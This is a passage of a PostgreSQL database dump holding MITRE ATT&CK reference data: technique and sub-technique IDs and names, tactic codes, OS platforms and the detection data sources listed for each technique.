T1591	Gather Victim Org Information	T1591.002	Business Relationships	TA0043	\N	\N
T1591	Gather Victim Org Information	T1591.003	Identify Business Tempo	TA0043	\N	\N
T1591	Gather Victim Org Information	T1591.004	Identify Roles	TA0043	\N	\N
T1061	Graphical User Interface	T1061	\N	TA0002	\N	\N
T1484	Group Policy Modification	T1484	\N	TA0005	\N	\N
T1200	Hardware Additions	T1200	\N	TA0001	\N	\N
T1564	Hide Artifacts	T1564.001	Hidden Files and Directories	TA0005	\N	\N
T1564	Hide Artifacts	T1564.002	Hidden Users	TA0005	\N	\N
T1564	Hide Artifacts	T1564.003	Hidden Window	TA0005	\N	\N
T1564	Hide Artifacts	T1564.004	NTFS File Attributes	TA0005	\N	\N
T1564	Hide Artifacts	T1564.005	Hidden File System	TA0005	\N	\N
T1564	Hide Artifacts	T1564.006	Run Virtual Instance	TA0005	\N	\N
T1564	Hide Artifacts	T1564.007	VBA Stomping	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.001	DLL Search Order Hijacking	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.002	DLL Side-Loading	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.004	Dylib Hijacking	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.005	Executable Installer File Permissions Weakness	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.006	LD_PRELOAD	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.007	Path Interception by PATH Environment Variable	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.008	Path Interception by Search Order Hijacking	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.009	Path Interception by Unquoted Path	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.010	Services File Permissions Weakness	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.011	Services Registry Permissions Weakness	TA0005	\N	\N
T1574	Hijack Execution Flow	T1574.012	COR_PROFILER	TA0005	\N	\N
T1062	Hypervisor	T1062	\N	TA0003	\N	\N
T1562	Impair Defenses	T1562.001	Disable or Modify Tools	TA0005	\N	\N
T1562	Impair Defenses	T1562.002	Disable Windows Event Logging	TA0005	\N	\N
T1562	Impair Defenses	T1562.003	Impair Command History Logging	TA0005	\N	\N
T1562	Impair Defenses	T1562.004	Disable or Modify System Firewall	TA0005	\N	\N
T1562	Impair Defenses	T1562.006	Indicator Blocking	TA0005	\N	\N
T1562	Impair Defenses	T1562.007	Disable or Modify Cloud Firewall	TA0005	\N	\N
T1562	Impair Defenses	T1562.008	Disable Cloud Logs	TA0005	\N	\N
T1525	Implant Container Image	T1525	\N	TA0003	\N	\N
T1070	Indicator Removal on Host	T1070.001	Clear Windows Event Logs	TA0005	\N	\N
T1070	Indicator Removal on Host	T1070.002	Clear Linux or Mac System Logs	TA0005	\N	\N
T1070	Indicator Removal on Host	T1070.003	Clear Command History	TA0005	\N	\N
T1070	Indicator Removal on Host	T1070.004	File Deletion	TA0005	\N	\N
T1070	Indicator Removal on Host	T1070.005	Network Share Connection Removal	TA0005	\N	\N
T1070	Indicator Removal on Host	T1070.006	Timestomp	TA0005	\N	\N
T1202	Indirect Command Execution	T1202	\N	TA0005	\N	\N
T1105	Ingress Tool Transfer	T1105	\N	TA0011	\N	\N
T1490	Inhibit System Recovery	T1490	\N	TA0040	\N	\N
T1056	Input Capture	T1056.001	Keylogging	TA0009	\N	\N
T1056	Input Capture	T1056.002	GUI Input Capture	TA0009	\N	\N
T1056	Input Capture	T1056.003	Web Portal Capture	TA0009	\N	\N
T1056	Input Capture	T1056.004	Credential API Hooking	TA0009	\N	\N
T1559	Inter-Process Communication	T1559.001	Component Object Model	TA0002	\N	\N
T1559	Inter-Process Communication	T1559.002	Dynamic Data Exchange	TA0002	\N	\N
T1534	Internal Spearphishing	T1534	\N	TA0008	\N	\N
T1149	LC_MAIN Hijacking	T1149	\N	TA0005	\N	\N
T1570	Lateral Tool Transfer	T1570	\N	TA0008	\N	\N
T1185	Man in the Browser	T1185	\N	TA0009	\N	\N
T1557	Man-in-the-Middle	T1557.001	LLMNR/NBT-NS Poisoning and SMB Relay	TA0009	\N	\N
T1557	Man-in-the-Middle	T1557.002	ARP Cache Poisoning	TA0009	\N	\N
T1036	Masquerading	T1036.001	Invalid Code Signature	TA0005	\N	\N
T1036	Masquerading	T1036.002	Right-to-Left Override	TA0005	\N	\N
T1036	Masquerading	T1036.003	Rename System Utilities	TA0005	\N	\N
T1036	Masquerading	T1036.004	Masquerade Task or Service	TA0005	\N	\N
T1036	Masquerading	T1036.005	Match Legitimate Name or Location	TA0005	\N	\N
T1036	Masquerading	T1036.006	Space after Filename	TA0005	\N	\N
T1556	Modify Authentication Process	T1556.001	Domain Controller Authentication	TA0006	\N	\N
T1556	Modify Authentication Process	T1556.002	Password Filter DLL	TA0006	\N	\N
T1556	Modify Authentication Process	T1556.003	Pluggable Authentication Modules	TA0006	\N	\N
T1556	Modify Authentication Process	T1556.004	Network Device Authentication	TA0006	\N	\N
T1578	Modify Cloud Compute Infrastructure	T1578.001	Create Snapshot	TA0005	\N	\N
T1578	Modify Cloud Compute Infrastructure	T1578.002	Create Cloud Instance	TA0005	\N	\N
T1578	Modify Cloud Compute Infrastructure	T1578.003	Delete Cloud Instance	TA0005	\N	\N
T1578	Modify Cloud Compute Infrastructure	T1578.004	Revert Cloud Instance	TA0005	\N	\N
T1112	Modify Registry	T1112	\N	TA0005	\N	\N
T1601	Modify System Image	T1601.001	Patch System Image	TA0005	\N	\N
T1601	Modify System Image	T1601.002	Downgrade System Image	TA0005	\N	\N
T1104	Multi-Stage Channels	T1104	\N	TA0011	\N	\N
T1026	Multiband Communication	T1026	\N	TA0011	\N	\N
T1106	Native API	T1106	\N	TA0002	\N	\N
T1599	Network Boundary Bridging	T1599.001	Network Address Translation Traversal	TA0005	\N	\N
T1498	Network Denial of Service	T1498.001	Direct Network Flood	TA0040	\N	\N
T1498	Network Denial of Service	T1498.002	Reflection Amplification	TA0040	\N	\N
T1046	Network Service Scanning	T1046	\N	TA0007	\N	\N
T1135	Network Share Discovery	T1135	\N	TA0007	\N	\N
T1040	Network Sniffing	T1040	\N	TA0006	\N	\N
T1095	Non-Application Layer Protocol	T1095	\N	TA0011	\N	\N
T1571	Non-Standard Port	T1571	\N	TA0011	\N	\N
T1003	OS Credential Dumping	T1003.001	LSASS Memory	TA0006	\N	\N
T1003	OS Credential Dumping	T1003.002	Security Account Manager	TA0006	\N	\N
T1003	OS Credential Dumping	T1003.003	NTDS	TA0006	\N	\N
T1003	OS Credential Dumping	T1003.004	LSA Secrets	TA0006	\N	\N
T1003	OS Credential Dumping	T1003.005	Cached Domain Credentials	TA0006	\N	\N
T1003	OS Credential Dumping	T1003.006	DCSync	TA0006	\N	\N
T1003	OS Credential Dumping	T1003.007	Proc Filesystem	TA0006	\N	\N
T1003	OS Credential Dumping	T1003.008	/etc/passwd and /etc/shadow	TA0006	\N	\N
T1027	Obfuscated Files or Information	T1027.001	Binary Padding	TA0005	\N	\N
T1027	Obfuscated Files or Information	T1027.002	Software Packing	TA0005	\N	\N
T1027	Obfuscated Files or Information	T1027.003	Steganography	TA0005	\N	\N
T1027	Obfuscated Files or Information	T1027.004	Compile After Delivery	TA0005	\N	\N
T1027	Obfuscated Files or Information	T1027.005	Indicator Removal from Tools	TA0005	\N	\N
T1588	Obtain Capabilities	T1588.001	Malware	TA0042	\N	\N
T1588	Obtain Capabilities	T1588.002	Tool	TA0042	\N	\N
T1588	Obtain Capabilities	T1588.003	Code Signing Certificates	TA0042	\N	\N
T1588	Obtain Capabilities	T1588.004	Digital Certificates	TA0042	\N	\N
T1588	Obtain Capabilities	T1588.005	Exploits	TA0042	\N	\N
T1588	Obtain Capabilities	T1588.006	Vulnerabilities	TA0042	\N	\N
T1137	Office Application Startup	T1137.001	Office Template Macros	TA0003	\N	\N
T1137	Office Application Startup	T1137.002	Office Test	TA0003	\N	\N
T1137	Office Application Startup	T1137.003	Outlook Forms	TA0003	\N	\N
T1137	Office Application Startup	T1137.004	Outlook Home Page	TA0003	\N	\N
T1137	Office Application Startup	T1137.005	Outlook Rules	TA0003	\N	\N
T1137	Office Application Startup	T1137.006	Add-ins	TA0003	\N	\N
T1201	Password Policy Discovery	T1201	\N	TA0007	\N	\N
T1034	Path Interception	T1034	\N	TA0003	\N	\N
T1120	Peripheral Device Discovery	T1120	\N	TA0007	\N	\N
T1069	Permission Groups Discovery	T1069.001	Local Groups	TA0007	\N	\N
T1069	Permission Groups Discovery	T1069.002	Domain Groups	TA0007	\N	\N
T1069	Permission Groups Discovery	T1069.003	Cloud Groups	TA0007	\N	\N
T1566	Phishing	T1566.001	Spearphishing Attachment	TA0001	\N	\N
T1566	Phishing	T1566.002	Spearphishing Link	TA0001	\N	\N
T1566	Phishing	T1566.003	Spearphishing via Service	TA0001	\N	\N
T1598	Phishing for Information	T1598.001	Spearphishing Service	TA0043	\N	\N
T1598	Phishing for Information	T1598.002	Spearphishing Attachment	TA0043	\N	\N
T1598	Phishing for Information	T1598.003	Spearphishing Link	TA0043	\N	\N
T1542	Pre-OS Boot	T1542.001	System Firmware	TA0005	\N	\N
T1542	Pre-OS Boot	T1542.002	Component Firmware	TA0005	\N	\N
T1542	Pre-OS Boot	T1542.003	Bootkit	TA0005	\N	\N
T1542	Pre-OS Boot	T1542.004	ROMMONkit	TA0005	\N	\N
T1542	Pre-OS Boot	T1542.005	TFTP Boot	TA0005	\N	\N
T1057	Process Discovery	T1057	\N	TA0007	\N	\N
T1055	Process Injection	T1055.001	Dynamic-link Library Injection	TA0005	\N	\N
T1055	Process Injection	T1055.002	Portable Executable Injection	TA0005	\N	\N
T1055	Process Injection	T1055.003	Thread Execution Hijacking	TA0005	\N	\N
T1055	Process Injection	T1055.004	Asynchronous Procedure Call	TA0005	\N	\N
T1055	Process Injection	T1055.005	Thread Local Storage	TA0005	\N	\N
T1055	Process Injection	T1055.008	Ptrace System Calls	TA0005	\N	\N
T1055	Process Injection	T1055.009	Proc Memory	TA0005	\N	\N
T1055	Process Injection	T1055.011	Extra Window Memory Injection	TA0005	\N	\N
T1055	Process Injection	T1055.012	Process Hollowing	TA0005	\N	\N
T1055	Process Injection	T1055.013	Process Doppelgnging	TA0005	\N	\N
T1055	Process Injection	T1055.014	VDSO Hijacking	TA0005	\N	\N
T1572	Protocol Tunneling	T1572	\N	TA0011	\N	\N
T1090	Proxy	T1090.001	Internal Proxy	TA0011	\N	\N
T1090	Proxy	T1090.002	External Proxy	TA0011	\N	\N
T1090	Proxy	T1090.003	Multi-hop Proxy	TA0011	\N	\N
T1090	Proxy	T1090.004	Domain Fronting	TA0011	\N	\N
T1108	Redundant Access	T1108	\N	TA0005	\N	\N
T1219	Remote Access Software	T1219	\N	TA0011	\N	\N
T1563	Remote Service Session Hijacking	T1563.001	SSH Hijacking	TA0008	\N	\N
T1563	Remote Service Session Hijacking	T1563.002	RDP Hijacking	TA0008	\N	\N
T1021	Remote Services	T1021.001	Remote Desktop Protocol	TA0008	\N	\N
T1021	Remote Services	T1021.002	SMB/Windows Admin Shares	TA0008	\N	\N
T1021	Remote Services	T1021.003	Distributed Component Object Model	TA0008	\N	\N
T1021	Remote Services	T1021.004	SSH	TA0008	\N	\N
T1021	Remote Services	T1021.005	VNC	TA0008	\N	\N
T1021	Remote Services	T1021.006	Windows Remote Management	TA0008	\N	\N
T1018	Remote System Discovery	T1018	\N	TA0007	\N	\N
T1091	Replication Through Removable Media	T1091	\N	TA0001	\N	\N
T1496	Resource Hijacking	T1496	\N	TA0040	\N	\N
T1207	Rogue Domain Controller	T1207	\N	TA0005	\N	\N
T1014	Rootkit	T1014	\N	TA0005	\N	\N
T1053	Scheduled Task/Job	T1053.001	At (Linux)	TA0002	\N	\N
T1053	Scheduled Task/Job	T1053.002	At (Windows)	TA0002	\N	\N
T1053	Scheduled Task/Job	T1053.003	Cron	TA0002	\N	\N
T1053	Scheduled Task/Job	T1053.004	Launchd	TA0002	\N	\N
T1053	Scheduled Task/Job	T1053.005	Scheduled Task	TA0002	\N	\N
T1053	Scheduled Task/Job	T1053.006	Systemd Timers	TA0002	\N	\N
T1029	Scheduled Transfer	T1029	\N	TA0010	\N	\N
T1113	Screen Capture	T1113	\N	TA0009	\N	\N
T1064	Scripting	T1064	\N	TA0005	\N	\N
T1597	Search Closed Sources	T1597.001	Threat Intel Vendors	TA0043	\N	\N
T1597	Search Closed Sources	T1597.002	Purchase Technical Data	TA0043	\N	\N
T1596	Search Open Technical Databases	T1596.001	DNS/Passive DNS	TA0043	\N	\N
T1596	Search Open Technical Databases	T1596.002	WHOIS	TA0043	\N	\N
T1596	Search Open Technical Databases	T1596.003	Digital Certificates	TA0043	\N	\N
T1596	Search Open Technical Databases	T1596.004	CDNs	TA0043	\N	\N
T1596	Search Open Technical Databases	T1596.005	Scan Databases	TA0043	\N	\N
T1593	Search Open Websites/Domains	T1593.001	Social Media	TA0043	\N	\N
T1593	Search Open Websites/Domains	T1593.002	Search Engines	TA0043	\N	\N
T1594	Search Victim-Owned Websites	T1594	\N	TA0043	\N	\N
T1505	Server Software Component	T1505.001	SQL Stored Procedures	TA0003	\N	\N
T1505	Server Software Component	T1505.002	Transport Agent	TA0003	\N	\N
T1505	Server Software Component	T1505.003	Web Shell	TA0003	\N	\N
T1489	Service Stop	T1489	\N	TA0040	\N	\N
T1129	Shared Modules	T1129	\N	TA0002	\N	\N
T1051	Shared Webroot	T1051	\N	TA0008	\N	\N
T1218	Signed Binary Proxy Execution	T1218.001	Compiled HTML File	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.002	Control Panel	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.003	CMSTP	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.004	InstallUtil	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.005	Mshta	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.007	Msiexec	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.008	Odbcconf	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.009	Regsvcs/Regasm	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.010	Regsvr32	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.011	Rundll32	TA0005	\N	\N
T1218	Signed Binary Proxy Execution	T1218.012	Verclsid	TA0005	\N	\N
T1216	Signed Script Proxy Execution	T1216.001	PubPrn	TA0005	\N	\N
T1072	Software Deployment Tools	T1072	\N	TA0002	\N	\N
T1518	Software Discovery	T1518.001	Security Software Discovery	TA0007	\N	\N
T1153	Source	T1153	\N	TA0002	\N	\N
T1528	Steal Application Access Token	T1528	\N	TA0006	\N	\N
T1539	Steal Web Session Cookie	T1539	\N	TA0006	\N	\N
T1558	Steal or Forge Kerberos Tickets	T1558.001	Golden Ticket	TA0006	\N	\N
T1558	Steal or Forge Kerberos Tickets	T1558.002	Silver Ticket	TA0006	\N	\N
T1558	Steal or Forge Kerberos Tickets	T1558.003	Kerberoasting	TA0006	\N	\N
T1558	Steal or Forge Kerberos Tickets	T1558.004	AS-REP Roasting	TA0006	\N	\N
T1553	Subvert Trust Controls	T1553.001	Gatekeeper Bypass	TA0005	\N	\N
T1553	Subvert Trust Controls	T1553.002	Code Signing	TA0005	\N	\N
T1553	Subvert Trust Controls	T1553.003	SIP and Trust Provider Hijacking	TA0005	\N	\N
T1553	Subvert Trust Controls	T1553.004	Install Root Certificate	TA0005	\N	\N
T1195	Supply Chain Compromise	T1195.001	Compromise Software Dependencies and Development Tools	TA0001	\N	\N
T1195	Supply Chain Compromise	T1195.002	Compromise Software Supply Chain	TA0001	\N	\N
T1195	Supply Chain Compromise	T1195.003	Compromise Hardware Supply Chain	TA0001	\N	\N
T1082	System Information Discovery	T1082	\N	TA0007	\N	\N
T1016	System Network Configuration Discovery	T1016	\N	TA0007	\N	\N
T1049	System Network Connections Discovery	T1049	\N	TA0007	\N	\N
T1033	System Owner/User Discovery	T1033	\N	TA0007	\N	\N
T1007	System Service Discovery	T1007	\N	TA0007	\N	\N
T1569	System Services	T1569.001	Launchctl	TA0002	\N	\N
T1569	System Services	T1569.002	Service Execution	TA0002	\N	\N
T1529	System Shutdown/Reboot	T1529	\N	TA0040	\N	\N
T1124	System Time Discovery	T1124	\N	TA0007	\N	\N
T1080	Taint Shared Content	T1080	\N	TA0008	\N	\N
T1221	Template Injection	T1221	\N	TA0005	\N	\N
T1205	Traffic Signaling	T1205.001	Port Knocking	TA0011	\N	\N
T1537	Transfer Data to Cloud Account	T1537	\N	TA0010	\N	\N
T1127	Trusted Developer Utilities Proxy Execution	T1127.001	MSBuild	TA0005	\N	\N
T1199	Trusted Relationship	T1199	\N	TA0001	\N	\N
T1111	Two-Factor Authentication Interception	T1111	\N	TA0006	\N	\N
T1552	Unsecured Credentials	T1552.001	Credentials In Files	TA0006	\N	\N
T1552	Unsecured Credentials	T1552.002	Credentials in Registry	TA0006	\N	\N
T1552	Unsecured Credentials	T1552.003	Bash History	TA0006	\N	\N
T1552	Unsecured Credentials	T1552.004	Private Keys	TA0006	\N	\N
T1552	Unsecured Credentials	T1552.005	Cloud Instance Metadata API	TA0006	\N	\N
T1552	Unsecured Credentials	T1552.006	Group Policy Preferences	TA0006	\N	\N
T1535	Unused/Unsupported Cloud Regions	T1535	\N	TA0005	\N	\N
T1550	Use Alternate Authentication Material	T1550.001	Application Access Token	TA0005	\N	\N
T1550	Use Alternate Authentication Material	T1550.002	Pass the Hash	TA0005	\N	\N
T1550	Use Alternate Authentication Material	T1550.003	Pass the Ticket	TA0005	\N	\N
T1550	Use Alternate Authentication Material	T1550.004	Web Session Cookie	TA0005	\N	\N
T1204	User Execution	T1204.001	Malicious Link	TA0002	\N	\N
T1204	User Execution	T1204.002	Malicious File	TA0002	\N	\N
T1078	Valid Accounts	T1078.001	Default Accounts	TA0005	\N	\N
T1078	Valid Accounts	T1078.002	Domain Accounts	TA0005	\N	\N
T1078	Valid Accounts	T1078.003	Local Accounts	TA0005	\N	\N
T1078	Valid Accounts	T1078.004	Cloud Accounts	TA0005	\N	\N
T1125	Video Capture	T1125	\N	TA0009	\N	\N
T1497	Virtualization/Sandbox Evasion	T1497.001	System Checks	TA0005	\N	\N
T1497	Virtualization/Sandbox Evasion	T1497.002	User Activity Based Checks	TA0005	\N	\N
T1497	Virtualization/Sandbox Evasion	T1497.003	Time Based Evasion	TA0005	\N	\N
T1600	Weaken Encryption	T1600.001	Reduce Key Space	TA0005	\N	\N
T1600	Weaken Encryption	T1600.002	Disable Crypto Hardware	TA0005	\N	\N
T1102	Web Service	T1102.001	Dead Drop Resolver	TA0011	\N	\N
T1102	Web Service	T1102.002	Bidirectional Communication	TA0011	\N	\N
T1102	Web Service	T1102.003	One-Way Communication	TA0011	\N	\N
T1047	Windows Management Instrumentation	T1047	\N	TA0002	\N	\N
T1220	XSL Script Processing	T1220	\N	TA0005	\N	\N
\.


--
-- Data for Name: tactic; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.tactic (tactic_id, tactic_name) FROM stdin;
TA0009	Collection
TA0011	Command and Control
TA0006	Credential Access
TA0005	Defense Evasion
TA0007	Discovery
TA0002	Execution
TA0010	Exfiltration
TA0040	Impact
TA0001	Initial Access
TA0008	Lateral Movement
TA0003	Persistence
TA0004	Privilege Escalation
TA0043	Reconnaissance
TA0042	Resource Development
\.


--
-- Data for Name: technique; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.technique (technique_id, technique_name, sub_technique_id, sub_technique_name, combine_tech_id, tactic_id, color, data_source, os_type, mitre_version) FROM stdin;
T1059	Command and Scripting Interpreter	T1059.007	JavaScript	T1059.007	TA0002	\N	{"Loaded DLLs","DLL monitoring","File monitoring","Process command-line parameters","Process monitoring"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1484	Domain Policy Modification	\N	\N	T1484	TA0005,TA0004	\N	{"Windows event logs"}	'Windows', 'Azure AD'	ATT&CK v8
T1546	Event Triggered Execution	T1546.004	Unix Shell Configuration Modification	T1546.004	TA0003,TA0004	\N	{"Process use of network","Process command-line parameters","Process monitoring","File monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.006	Dynamic Linker Hijacking	T1574.006	TA0005,TA0003,TA0004	\N	{"Process monitoring","File monitoring","Environment variable"}	'Linux', 'macOS'	ATT&CK v8
T1592	Gather Victim Host Information	\N	\N	T1592	TA0043	\N	\N	'PRE'	ATT&CK v8
T1003	OS Credential Dumping	T1003.006	DCSync	T1003.006	TA0006	\N	{"Windows event logs"}	'Windows'	ATT&CK v8
T1597	Search Closed Sources	\N	\N	T1597	TA0043	\N	\N	'PRE'	ATT&CK v8
T1584	Compromise Infrastructure	T1584.001	Domains	T1584.001	TA0042	\N	\N	'PRE'	ATT&CK v8
T1564	Hide Artifacts	T1564.005	Hidden File System	T1564.005	TA0005	\N	{"File monitoring","Windows Registry"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1124	System Time Discovery	\N	\N	T1124	TA0007	\N	{"Process monitoring","Process command-line parameters","API monitoring"}	'Windows'	ATT&CK v8
T1589	Gather Victim Identity Information	T1589.003	Employee Names	T1589.003	TA0043	\N	\N	'PRE'	ATT&CK v8
T1037	Boot or Logon Initialization Scripts	T1037.004	RC Scripts	T1037.004	TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'macOS', 'Linux'	ATT&CK v8
T1134	Access Token Manipulation	T1134.001	Token Impersonation/Theft	T1134.001	TA0005,TA0004	\N	{"Process command-line parameters","Process monitoring","Access tokens","API monitoring"}	'Windows'	ATT&CK v8
T1588	Obtain Capabilities	\N	\N	T1588	TA0042	\N	\N	'PRE'	ATT&CK v8
T1600	Weaken Encryption	\N	\N	T1600	TA0005	\N	{"File monitoring"}	'Network'	ATT&CK v8
T1599	Network Boundary Bridging	\N	\N	T1599	TA0005	\N	{"Netflow/Enclave netflow","Packet capture"}	'Network'	ATT&CK v8
T1543	Create or Modify System Process	T1543.001	Launch Agent	T1543.001	TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'macOS'	ATT&CK v8
T1062	Hypervisor	\N	\N	T1062	TA0003	\N	{"System calls"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.013	XDG Autostart Entries	T1547.013	TA0003,TA0004		{"File: File Creation","File: File Modification","Process: Process Creation","Command: Command Execution"}	Linux	ATT&CK v9
T1547	Boot or Logon Autostart Execution	T1547.014	Active Setup	T1547.014	TA0003,TA0004		{"Windows Registry: Windows Registry Key Creation","Windows Registry: Windows Registry Key Modification","Process: Process Creation","Command: Command Execution"}	Windows	ATT&CK v9
T1612	Build Image on Host			T1612	TA0005		{"Image: Image Creation","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"}	Containers	ATT&CK v9
T1609	Container Administration Command			T1609	TA0002		{"Command: Command Execution"}	Containers	ATT&CK v9
T1613	Container and Resource Discovery			T1613	TA0007		{"Cluster: Cluster Metadata","Container: Container Enumeration","Container: Container Metadata","Pod: Pod Enumeration","Pod: Pod Metadata","Application Log: Application Log Content"}	Containers	ATT&CK v9
T1555	Credentials from Password Stores	T1555.004	Windows Credential Manager	T1555.004	TA0006		{"Process: Process Creation","Command: Command Execution","Process: OS API Execution","File: File Access"}	Windows	ATT&CK v9
T1555	Credentials from Password Stores	T1555.005	Password Managers	T1555.005	TA0006		{"Process: OS API Execution","File: File Access","Process: Process Access","Command: Command Execution"}	Linux,macOS,Windows	ATT&CK v9
T1610	Deploy Container			T1610	TA0005,TA0002		{"Container: Container Creation","Container: Container Start","Pod: Pod Creation","Pod: Pod Modification","Application Log: Application Log Content"}	Containers	ATT&CK v9
T1484	Domain Policy Modification	T1484.001	Group Policy Modification	T1484.001	TA0005,TA0004		{"Active Directory: Active Directory Object Creation","Active Directory: Active Directory Object Deletion","Active Directory: Active Directory Object Modification","Command: Command Execution"}	Windows	ATT&CK v9
T1484	Domain Policy Modification	T1484.002	Domain Trust Modification	T1484.002	TA0005,TA0004		{"Active Directory: Active Directory Object Creation","Active Directory: Active Directory Object Modification","Command: Command Execution"}	Windows,Azure AD	ATT&CK v9
T1611	Escape to Host			T1611	TA0004		{"Container: Container Creation","Process: OS API Execution","Process: Process Creation"}	Windows,Linux,Containers	ATT&CK v9
T1606	Forge Web Credentials			T1606	TA0006		{"Logon Session: Logon Session Creation","Web Credential: Web Credential Creation","Web Credential: Web Credential Usage"}	SaaS,Windows,macOS,Linux,Azure AD,Office 365,Google Workspace	ATT&CK v9
T1053	Scheduled Task/Job	T1053.007	Container Orchestration Job	T1053.007	TA0002,TA0003,TA0004		{"Scheduled Job: Scheduled Job Creation","Container: Container Creation","File: File Creation"}	Containers	ATT&CK v9
T1608	Stage Capabilities			T1608	TA0042		\N	PRE	ATT&CK v9
T1553	Subvert Trust Controls	T1553.005	Mark-of-the-Web Bypass	T1553.005	TA0005		{"File: File Creation","File: File Metadata"}	Windows	ATT&CK v9
T1553	Subvert Trust Controls	T1553.006	Code Signing Policy Modification	T1553.006	TA0005		{"Windows Registry: Windows Registry Key Modification","Command: Command Execution","Process: Process Creation"}	Windows,macOS	ATT&CK v9
T1614	System Location Discovery			T1614	TA0007		{"Instance: Instance Metadata","Process: Process Creation","Command: Command Execution","Process: OS API Execution"}	Windows,Linux,macOS,IaaS	ATT&CK v9
T1016	System Network Configuration Discovery	T1016.001	Internet Connection Discovery	T1016.001	TA0007		{"Process: Process Creation","Command: Command Execution"}	Windows,Linux,macOS	ATT&CK v9
T1552	Unsecured Credentials	T1552.007	Container API	T1552.007	TA0006		{"Command: Command Execution","File: File Access","User Account: User Account Authentication"}	Containers	ATT&CK v9
T1204	User Execution	T1204.003	Malicious Image	T1204.003	TA0002		{"Container: Container Creation","Container: Container Start","Command: Command Execution","Image: Image Creation","Instance: Instance Creation","Instance: Instance Start","Application Log: Application Log Content"}	IaaS,Containers	ATT&CK v9
T1606	Forge Web Credentials	T1606.001	Web Cookies	T1606.001	TA0006		{"Logon Session: Logon Session Creation","Web Credential: Web Credential Creation","Web Credential: Web Credential Usage"}	Linux,macOS,Windows,SaaS	ATT&CK v9
T1606	Forge Web Credentials	T1606.002	SAML Tokens	T1606.002	TA0006		{"Logon Session: Logon Session Creation","Web Credential: Web Credential Creation","Web Credential: Web Credential Usage"}	Azure AD,SaaS,Windows,Office 365,Google Workspace	ATT&CK v9
T1608	Stage Capabilities	T1608.001	Upload Malware	T1608.001	TA0042		\N	PRE	ATT&CK v9
T1608	Stage Capabilities	T1608.002	Upload Tool	T1608.002	TA0042		\N	PRE	ATT&CK v9
T1608	Stage Capabilities	T1608.003	Install Digital Certificate	T1608.003	TA0042		\N	PRE	ATT&CK v9
T1608	Stage Capabilities	T1608.004	Drive-by Target	T1608.004	TA0042		\N	PRE	ATT&CK v9
T1608	Stage Capabilities	T1608.005	Link Target	T1608.005	TA0042		\N	PRE	ATT&CK v9
T1134	Access Token Manipulation	T1134.004	Parent PID Spoofing	T1134.004	TA0005,TA0004	\N	{"API monitoring","Process monitoring","Windows event logs"}	'Windows'	ATT&CK v8
T1531	Account Access Removal	\N	\N	T1531	TA0040		{"Windows event logs","Process command-line parameters","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1087	Account Discovery	T1087.001	Local Account	T1087.001	TA0007	\N	{"API monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1087	Account Discovery	T1087.003	Email Account	T1087.003	TA0007	\N	{"Office 365 account logs","Process monitoring","Process command-line parameters"}	'Windows', 'Office 365', 'Google Workspace'	ATT&CK v8
T1098	Account Manipulation	\N	\N	T1098	TA0003	\N	{"Authentication logs","Windows event logs"}	'Windows', 'Azure AD', 'Office 365', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1098	Account Manipulation	T1098.003	Add Office 365 Global Administrator Role	T1098.003	TA0003	\N	{"Office 365 audit logs"}	'Office 365'	ATT&CK v8
T1098	Account Manipulation	T1098.004	SSH Authorized Keys	T1098.004	TA0003	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Linux', 'macOS'	ATT&CK v8
T1583	Acquire Infrastructure	\N	\N	T1583	TA0042	\N	\N	'PRE'	ATT&CK v8
T1583	Acquire Infrastructure	T1583.001	Domains	T1583.001	TA0042	\N	{"Domain registration"}	'PRE'	ATT&CK v8
T1583	Acquire Infrastructure	T1583.002	DNS Server	T1583.002	TA0042	\N	\N	'PRE'	ATT&CK v8
T1583	Acquire Infrastructure	T1583.004	Server	T1583.004	TA0042	\N	\N	'PRE'	ATT&CK v8
T1583	Acquire Infrastructure	T1583.005	Botnet	T1583.005	TA0042	\N	\N	'PRE'	ATT&CK v8
T1583	Acquire Infrastructure	T1583.006	Web Services	T1583.006	TA0042	\N	\N	'PRE'	ATT&CK v8
T1595	Active Scanning	\N	\N	T1595	TA0043	\N	{"Packet capture","Network device logs"}	'PRE'	ATT&CK v8
T1595	Active Scanning	T1595.001	Scanning IP Blocks	T1595.001	TA0043	\N	{"Packet capture","Network device logs"}	'PRE'	ATT&CK v8
T1010	Application Window Discovery	\N	\N	T1010	TA0007	\N	{"API monitoring","Process monitoring","Process command-line parameters"}	'macOS', 'Windows'	ATT&CK v8
T1560	Archive Collected Data	T1560.001	Archive via Utility	T1560.001	TA0009	\N	{"Process monitoring","Process command-line parameters","File monitoring","Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1560	Archive Collected Data	T1560.003	Archive via Custom Method	T1560.003	TA0009	\N	\N	'Linux', 'macOS', 'Windows'	ATT&CK v8
